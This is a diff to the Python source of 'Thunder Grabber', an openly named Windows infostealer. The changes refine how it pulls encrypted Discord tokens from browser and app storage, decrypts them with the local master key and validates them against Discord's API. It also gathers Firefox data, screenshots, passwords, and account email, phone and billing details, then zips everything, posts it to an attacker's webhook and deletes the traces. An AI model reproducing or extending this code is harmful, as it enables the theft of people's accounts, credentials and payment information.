@@ -11,7 +11,6 @@ import random
 import zipfile
 import socket
 import sqlite3
-import codecs
 import platform
 import win32crypt
 import subprocess
@@ -24,10 +23,10 @@ from win32crypt import CryptUnprotectData
 from PIL import ImageGrab
 from json import load
 from sys import argv
+from base64 import b64decode
 from threading import Thread
 from re import findall, match
 from urllib.request import urlopen
-from discord import File, Webhook, RequestsWebhookAdapter
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma
 
@@ -158,7 +157,7 @@ class grabber:
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
+        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
         self.tokens = []
         self.robloxcookies = []
         self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
@@ -344,16 +343,19 @@ class grabber:
             'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
         
-        for _, path in paths.items():
+        for name, path in paths.items():
             if not os.path.exists(path):
                 continue
-            if not "discord" in path:
-                for file_name in os.listdir(path):
-                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                        continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
-                            for token in findall(regex, line):
+            disc = name.replace(" ", "").lower()
+            if "cord" in path:
+                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
+                    for file_name in os.listdir(path):
+                        if file_name[-3:] not in ["log", "ldb"]:
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for y in findall(self.encrypted_regex, line):
+                                token = self.decrypt_password(b64decode(
+                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                 try:
                                     r = requests.get(self.baseurl, headers=self.getheaders(token))
                                 except Exception:
@@ -361,18 +363,17 @@ class grabber:
                                 if r.status_code == 200 and token not in self.tokens:
                                     self.tokens.append(token)
             else:
-                if os.path.exists(self.roaming+'\\discord\\Local State'):
-                    for file_name in os.listdir(path):
-                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(self.encrypted_regex, line):
-                                token = None
-                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-                                
+                for file_name in os.listdir(path):
+                    if file_name[-3:] not in ["log", "ldb"]:
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for token in findall(self.regex, line):
+                            try:
                                 r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                if r.status_code == 200 and token not in self.tokens:
-                                    self.tokens.append(token)
+                            except Exception:
+                                pass
+                            if r.status_code == 200 and token not in self.tokens:
+                                self.tokens.append(token)
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
@@ -380,14 +381,14 @@ class grabber:
                     if not _file.endswith('.sqlite'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
-                            for token in findall(regex, line):
-                                try:
-                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                except Exception:
-                                    pass
-                                if r.status_code == 200 and token not in self.tokens:
-                                    self.tokens.append(token)
+                        for token in findall(self.regex, line):
+                            try:
+                                r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            except Exception:
+                                pass
+                            if r.status_code == 200 and token not in self.tokens:
+                                self.tokens.append(token)
+
                                     
     def screenshot(self):
         image = ImageGrab.grab(
@@ -470,7 +471,7 @@ class grabber:
                 hostname = socket.gethostname()
                 webhook = DiscordWebhook(url=weblink, username="Thunder", avatar_url="https://cdn.discordapp.com/attachments/961950134814535700/961950224874631228/Thighs2.jpg")
                 
-                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉")
+                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉",color=16777215)
                 embed.set_author(name="⚡ Thunder Grabber ⚡", url='https://github.com/TWIST-X7')
                 embed.add_embed_field(name='🧾 Account Inforamtion ', value=f"""```
 [Username] : {user_name}\n[User ID] : {user_id}\n[Phone Number] : {phone_number}\n[Email] : {email}\n[2FA/MFA Enabled] : {mfa_enabled}\n[Nitro Status] : {has_nitro}\n[Payment Method] : {billing} ```""", inline=False)
@@ -504,8 +505,12 @@ class grabber:
         try:
             tempfolder = os.getenv("temp")+"\\Thunder"
             f2 = open(f"{tempfolder}\\passwords.txt", "w")
-            f2.write(spyware().get_info())
-            f2.close()
+            try:
+                f2.write(spyware().get_info())
+                f2.close()
+            except:
+                f2.write("Thunder Grabber Made By TWISTX7#9122 https://github.com/TWIST-X7/Thunder-Grabber\nNo Passwords Found")
+                f2.close()
             appdata = os.getenv("localappdata")
             _zipfile = os.path.join(appdata, f'{os.getenv("UserName")}-Info.zip')
             zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -516,13 +521,8 @@ class grabber:
                     arcname = absname[len(abs_src) + 1:]
                     zipped_file.write(absname, arcname)
             zipped_file.close()
-            # with ZipFile(f'{tempfolder}\\{os.getenv("UserName")}-Info.zip', 'w') as zipf:
-            #     zipf.write(f"{tempfolder}\\passwords.txt" , basename(f"{tempfolder}\\passwords.txt"))
-            #     zipf.write(f"{tempfolder}\\Screenshot.png", basename(f"{tempfolder}\\Screenshot.png"))
-            file5 = None
-            file5 = File(f'{appdata}\\{os.getenv("UserName")}-Info.zip')
-            webhook2 = Webhook.from_url(weblink, adapter=RequestsWebhookAdapter())
-            webhook2.send(file=file5, username="Thunder", avatar_url="https://cdn.discordapp.com/attachments/961950134814535700/961950224874631228/Thighs2.jpg")
+            with open(_zipfile, 'rb') as f:
+                httpx.post(weblink, files={'upload_file': f})
             shutil.rmtree(tempfolder)
             os.remove(f'{appdata}\\{os.getenv("UserName")}-Info.zip')
         except:
